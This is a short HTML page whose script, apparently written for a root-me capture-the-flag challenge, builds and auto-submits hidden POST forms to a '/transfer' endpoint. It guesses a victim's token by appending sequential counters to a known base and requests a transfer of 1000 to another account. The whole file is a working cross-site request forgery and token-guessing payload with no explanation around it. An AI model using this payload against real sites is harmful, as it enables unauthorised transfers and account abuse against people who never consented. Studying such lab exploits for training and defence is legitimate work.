<!DOCTYPE html>
<html>
<body>
    <script>
        const victimBase = "6594d3fb4300bf0200"; // the_dwalt00ns
        const counters = ["000000", "000001", "000002"];
        
        counters.forEach((ctr, i) => {
            let f = document.createElement("form");
            f.action = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer";
            f.method = "POST";
            f.target = "_blank"; // Abrimos en pestañas nuevas para que no se pisen

            let data = {
                "token": victimBase + ctr,
                "recipient": "test",
                "amount": "1000"
            };

            for (let key in data) {
                let opt = document.createElement("input");
                opt.type = "hidden";
                opt.name = key;
                opt.value = data[key];
                f.appendChild(opt);
            }
            document.body.appendChild(f);
            f.submit();
        });
    </script>
</body>
</html>
